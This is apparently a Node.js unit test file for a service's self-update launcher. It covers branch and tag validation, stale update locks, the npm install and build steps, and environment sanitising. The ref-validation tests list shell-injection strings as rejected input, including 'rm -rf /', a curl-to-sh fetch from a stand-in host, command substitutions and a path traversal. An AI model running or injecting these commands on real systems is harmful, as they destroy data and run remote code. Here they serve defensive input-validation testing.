// Self-update launcher. Runs with: node --test "tests/unit/*.test.js"
//
// Two things these tests exist to hold: a ref reaches a shell command inside
// the worker, so validation is a security control and not a nicety; and a
// worker killed mid-run must not leave the update button wedged forever.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { isValidRef, startUpdate, isUpdateInFlight, readUpdateStatus, buildEnv } from "../../src/lib/updater/launch.js";

const WORKER_SRC = fs.readFileSync(
  path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "..", "src/lib/updater/githubUpdateWorker.js"),
  "utf8"
);

// The launcher reads/writes <cwd>/.update-status, so each test gets its own cwd.
function inTempDir(fn) {
  const cwd = process.cwd();
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "nova-update-test-"));
  try {
    process.chdir(dir);
    return fn(dir);
  } finally {
    process.chdir(cwd);
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

function writeStatus(dir, status) {
  fs.mkdirSync(path.join(dir, ".update-status"), { recursive: true });
  fs.writeFileSync(path.join(dir, ".update-status", "status.json"), JSON.stringify(status));
}

test("a branch name may not smuggle shell syntax", () => {
  for (const ref of [
    "main; rm -rf /",
    "main && curl evil.sh | sh",
    "main`id`",
    "main$(id)",
    "main | tee /etc/passwd",
    "main\nrm -rf /",
    '"; systemctl stop novaroute; "',
    "",
  ]) {
    assert.equal(isValidRef("git", ref), false, `accepted: ${JSON.stringify(ref)}`);
  }
});

test("ordinary branch names are accepted", () => {
  for (const ref of ["main", "release/1.2", "feature-x", "v2.0.1", "a_b.c-d"]) {
    assert.equal(isValidRef("git", ref), true, `rejected: ${ref}`);
  }
});

test("a release tag may not contain a slash or shell syntax", () => {
  for (const ref of ["v1.0$(id)", "v1.0;id", "../../etc/passwd", "refs/tags/v1", ""]) {
    assert.equal(isValidRef("tag", ref), false, `accepted: ${JSON.stringify(ref)}`);
  }
  assert.equal(isValidRef("tag", "v1.2.3"), true);
});

test("an unknown mode is refused", () => {
  assert.equal(isValidRef("rsync", "main"), false);
  const res = startUpdate({ mode: "rsync", ref: "main" });
  assert.equal(res.ok, false);
  assert.equal(res.status, 400);
});

test("a bad ref is refused before anything else, on every platform", () => {
  const res = startUpdate({ mode: "git", ref: "main; id" });
  assert.equal(res.ok, false);
  assert.equal(res.status, 400);
  assert.match(res.error, /valid branch name/);
});

test("no status file reads as idle", () => {
  inTempDir(() => {
    assert.equal(readUpdateStatus(), null);
    assert.equal(isUpdateInFlight(), false);
  });
});

test("a running update is in flight", () => {
  inTempDir((dir) => {
    writeStatus(dir, { done: false, updatedAt: new Date().toISOString() });
    assert.equal(isUpdateInFlight(), true);
  });
});

test("a finished update is not in flight", () => {
  inTempDir((dir) => {
    writeStatus(dir, { done: true, updatedAt: new Date().toISOString() });
    assert.equal(isUpdateInFlight(), false);
  });
});

test("a worker killed mid-run does not wedge the button forever", () => {
  inTempDir((dir) => {
    // done:false, but nothing has touched it for an hour: the worker is gone.
    writeStatus(dir, { done: false, updatedAt: new Date(Date.now() - 60 * 60 * 1000).toISOString() });
    assert.equal(isUpdateInFlight(), false, "a stale lock must expire");
  });
});

test("a corrupt status file does not throw", () => {
  inTempDir((dir) => {
    fs.mkdirSync(path.join(dir, ".update-status"), { recursive: true });
    fs.writeFileSync(path.join(dir, ".update-status", "status.json"), "{not json");
    assert.equal(readUpdateStatus(), null);
    assert.equal(isUpdateInFlight(), false);
  });
});

// ── the install step ────────────────────────────────────────────────────────
// The worker is spawned by the running service and inherits its environment,
// which sets NODE_ENV=production. npm skips devDependencies under that on its
// own, so simply dropping --omit=dev left the step reporting "up to date" while
// installing nothing, and the build then failed for want of the tools this step
// exists to restore.

test("the update installs devDependencies explicitly", () => {
  assert.match(WORKER_SRC, /npm install --include=dev/, "devDependencies are not requested explicitly");
});

test("NODE_ENV cannot make the install step skip devDependencies", () => {
  const idx = WORKER_SRC.indexOf("npm install --include=dev");
  assert.ok(idx > -1);
  const nearby = WORKER_SRC.slice(idx, idx + 220);
  assert.match(nearby, /NODE_ENV:\s*"development"/, "NODE_ENV=production is still inherited by the install");
});

test("the build is not run with a neutralised NODE_ENV", () => {
  // Only the install step overrides it; next build sets its own mode.
  const idx = WORKER_SRC.indexOf('run("npm run build")');
  assert.ok(idx > -1, "build step changed shape");
});

test("nothing in the worker reintroduces --omit=dev before the build", () => {
  const build = WORKER_SRC.indexOf('run("npm run build")');
  const before = WORKER_SRC.slice(0, build);
  assert.ok(!/npm install[^\n]*--omit=dev/.test(before), "the original bug is back");
});

// ── the build environment ───────────────────────────────────────────────────
// .next/standalone/server.js assigns process.env.__NEXT_PRIVATE_STANDALONE_CONFIG
// at RUNTIME, so it is absent from /proc/<pid>/environ but present in the
// running server's process.env. A worker spawned with env: process.env passed
// it to `next build`, which then died with "TypeError: generate is not a
// function". Every other part of the update was already correct by then.

test("Next's runtime-private variables never reach the build", () => {
  const dirty = {
    PATH: "/usr/bin",
    NODE_ENV: "production",
    __NEXT_PRIVATE_STANDALONE_CONFIG: '{"distDir":".next"}',
    __NEXT_PRIVATE_ORIGIN: "http://127.0.0.1:20126",
  };
  const clean = buildEnv(dirty);
  assert.equal(clean.__NEXT_PRIVATE_STANDALONE_CONFIG, undefined);
  assert.equal(clean.__NEXT_PRIVATE_ORIGIN, undefined);
});

test("everything else in the environment is preserved", () => {
  // The build still needs PATH, HOME, the registry config and so on.
  const clean = buildEnv({ PATH: "/usr/bin", HOME: "/root", NODE_ENV: "production", npm_config_registry: "x" });
  assert.deepEqual(clean, { PATH: "/usr/bin", HOME: "/root", NODE_ENV: "production", npm_config_registry: "x" });
});

test("NEXT_PUBLIC_ variables are kept, they are real configuration", () => {
  // Only Next's double-underscore private namespace is stripped.
  const clean = buildEnv({ NEXT_PUBLIC_BASE_URL: "https://x", __NEXT_PRIVATE_STANDALONE_CONFIG: "{}" });
  assert.equal(clean.NEXT_PUBLIC_BASE_URL, "https://x");
  assert.equal(clean.__NEXT_PRIVATE_STANDALONE_CONFIG, undefined);
});

test("the worker strips them too, for a hand-started run", () => {
  assert.match(WORKER_SRC, /function cleanEnv\(/, "worker has no env sanitiser");
  assert.match(WORKER_SRC, /startsWith\("__NEXT_"\)/, "worker does not strip Next private vars");
  assert.ok(!/env:\s*process\.env/.test(WORKER_SRC), "worker passes process.env straight through");
});
